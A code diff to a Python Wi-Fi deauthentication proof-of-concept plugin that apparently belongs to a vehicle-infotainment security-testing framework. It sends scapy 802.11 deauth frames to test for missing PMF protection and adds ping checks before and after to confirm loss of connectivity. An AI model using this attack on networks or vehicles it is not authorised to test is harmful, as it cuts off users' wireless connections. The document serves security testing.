@@ -10,10 +10,19 @@ Prerequisites: 支持Monitor模式和包注入的无线网卡 (如 wlan0mon)，�
 Usage: python3 33_WiFi_Deauth.py <interface> [target_bssid] [client_mac]
 """
 import sys
-import time
+import subprocess
 from iv_plugin_base import IVIVulnerabilityPlugin
 
 class WiFiDeauthPlugin(IVIVulnerabilityPlugin):
+    meta_poc_name = "WiFi Deauth"
+    meta_cve_id = "N/A"
+    meta_severity = "Medium"
+    meta_protocol = "rf"
+    meta_target_os = ["all"]
+    meta_required_params = ["interface"]
+    is_disruptive = False
+    meta_destructive_level = "Safe"
+
     def check_prerequisites(self):
         try:
             import scapy.all as scapy
@@ -22,10 +31,25 @@ class WiFiDeauthPlugin(IVIVulnerabilityPlugin):
             return False
             
         self.interface = self.params.get("interface", "")
+        self.probe_ip = self.params.get("probe_ip")
         if not self.interface:
             self.logger.error("未指定无线网卡接口 (如 wlan0mon)。请在参数中提供 interface。")
             return False
         return True
+
+    def _ping(self, ip):
+        if not ip:
+            return None
+        try:
+            result = subprocess.run(
+                ["ping", "-c", "1", "-W", "1", ip],
+                capture_output=True,
+                text=True,
+                timeout=3,
+            )
+            return result.returncode == 0
+        except Exception:
+            return None
 
     def exploit(self):
         self.logger.info(f"准备执行 Wi-Fi Deauth 攻击，使用网卡: {self.interface}")
@@ -42,6 +66,7 @@ class WiFiDeauthPlugin(IVIVulnerabilityPlugin):
             # Reason Code 7: Class 3 frame received from nonassociated STA
             dot11 = Dot11(addr1=client_mac, addr2=target_bssid, addr3=target_bssid)
             packet = RadioTap()/dot11/Dot11Deauth(reason=7)
+            pre_ping = self._ping(self.probe_ip)
             
             self.logger.info("开始发送 Deauth 帧 (安全验证模式，仅尝试 3 次)...")
             try:
@@ -55,12 +80,18 @@ class WiFiDeauthPlugin(IVIVulnerabilityPlugin):
                     "details": str(e)
                 }
                 
-            self.logger.warning("[!] 如果目标车辆的 Wi-Fi 连接中断，说明未开启 PMF 保护。")
+            post_ping = self._ping(self.probe_ip)
+            if self.probe_ip and pre_ping is True and post_ping is False:
+                return {
+                    "status": "success",
+                    "vulnerable": True,
+                    "details": f"Probe host {self.probe_ip} was reachable before deauth but unreachable afterwards, indicating PMF was not protecting the link."
+                }
             
             return {
                 "status": "success",
-                "vulnerable": True,
-                "details": "Successfully injected 802.11 Deauth frames. Check target connectivity."
+                "vulnerable": False,
+                "details": "Deauth frames transmitted, but no automated post-attack connectivity loss was proven. Provide probe_ip for strict verification."
             }
 
         except Exception as e:
@@ -74,5 +105,5 @@ if __name__ == "__main__":
     if len(sys.argv) < 2:
         print("Usage: python3 33_WiFi_Deauth.py <interface> [target_bssid] [client_mac]")
         sys.exit(1)
-    plugin = WiFiDeauthPlugin({"interface": iface})
+    plugin = WiFiDeauthPlugin({"interface": sys.argv[1]})
     plugin.run_verify()
